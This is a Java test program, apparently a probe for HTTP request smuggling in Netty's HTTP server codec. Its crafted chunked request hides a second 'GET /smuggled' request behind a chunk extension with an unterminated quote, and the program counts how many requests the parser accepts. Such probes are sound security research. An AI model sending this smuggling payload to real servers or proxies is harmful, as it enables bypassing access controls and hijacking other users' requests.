import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.http.FullHttpRequest;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.HttpServerCodec;
import io.netty.util.ReferenceCountUtil;
import java.nio.charset.StandardCharsets;

public class NettyChunkProbe {
    public static void main(String[] args) {
        String request = "POST / HTTP/1.1\r\nHost: localhost\r\n"
                + "Transfer-Encoding: chunked\r\n\r\n1;a=\"\r\nX\r\n0\r\n\r\n"
                + "GET /smuggled HTTP/1.1\r\nHost: localhost\r\nContent-Length: 11\r\n\r\n"
                + "\"\r\nY\r\n0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpServerCodec(), new HttpObjectAggregator(65536));
        int accepted = 0;
        int failed = 0;
        int smuggled = 0;
        try {
            channel.writeInbound(Unpooled.copiedBuffer(request, StandardCharsets.US_ASCII));
            Object message;
            while ((message = channel.readInbound()) != null) {
                if (message instanceof FullHttpRequest) {
                    FullHttpRequest decoded = (FullHttpRequest) message;
                    if (decoded.decoderResult().isSuccess()) {
                        accepted++;
                        if ("/smuggled".equals(decoded.uri())) {
                            smuggled++;
                        }
                    } else {
                        failed++;
                    }
                }
                ReferenceCountUtil.release(message);
            }
            Object response;
            int outbound = 0;
            while ((response = channel.readOutbound()) != null) {
                outbound++;
                ReferenceCountUtil.release(response);
            }
            System.out.println("ACCEPTED_REQUESTS=" + accepted);
            System.out.println("FAILED_REQUESTS=" + failed);
            System.out.println("SMUGGLED_REQUESTS=" + smuggled);
            System.out.println("OUTBOUND_MESSAGES=" + outbound);
        } finally {
            channel.finishAndReleaseAll();
        }
    }
}
